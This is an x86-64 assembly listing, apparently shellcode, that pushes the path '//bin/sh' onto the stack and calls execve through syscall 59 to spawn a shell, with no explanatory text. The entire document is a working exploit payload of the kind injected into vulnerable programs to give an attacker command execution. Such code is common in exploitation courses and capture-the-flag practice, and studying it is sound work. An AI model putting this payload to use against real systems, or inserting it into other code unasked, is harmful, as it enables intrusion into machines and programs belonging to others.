section .text
global _start

_start:
	xor esi, esi                    ; argv = 0
	xor edx, edx                    ; envp = 0
	push rsi                        ; null terminator
	
	mov rbx, 0x68732f6e69622f2f     ; path
	push rbx
	
	mov rdi, rsp                    

	push 59                         ; syscall number
	pop rax
	syscall                         ; execve(const char *filename, char *const argv[], char *const envp[]);
